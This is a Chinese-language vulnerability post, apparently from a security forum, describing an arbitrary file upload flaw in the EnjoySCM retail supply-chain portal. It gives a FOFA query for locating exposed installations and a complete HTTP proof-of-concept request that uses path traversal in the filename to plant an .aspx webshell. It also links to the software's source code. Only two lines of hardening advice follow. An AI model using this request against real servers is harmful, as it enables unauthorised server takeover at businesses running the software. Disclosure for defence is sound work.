# EnjoySCM UploadFile 任意文件上传漏洞

    \[漏洞情报\] EnjoySCM UploadFile 任意文件上传漏洞
=====================================

漏洞标题

EnjoySCM UploadFile 任意文件上传漏洞



漏洞描述

EnjoySCM是一款适应于零售企业的供应链管理软件，主要为零售企业的供应商提供服务。  

EnjoySCM UploadFile 参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。

**漏洞细节:**



FOFA：
-----

```null
title="供应商网上服务厅"
```

PoC:
----

```null
POST /File/UploadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
Content-Length: 531
Connection: close
Cookie: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="../../../1111.aspx"
Content-Type: image/jpeg

webshell
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"

unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"

-----------------------------21909179191068471382830692394
```

![](https://forum.ywhack.com/attachments/month_2302/2302232158d0fd6572e5988574.png)

这套系统漏洞很多，源码可以在这里下载：[https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip](https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip)

**加固建议:**

严格限制上传文件类型；  
联系厂商获取加固建议。
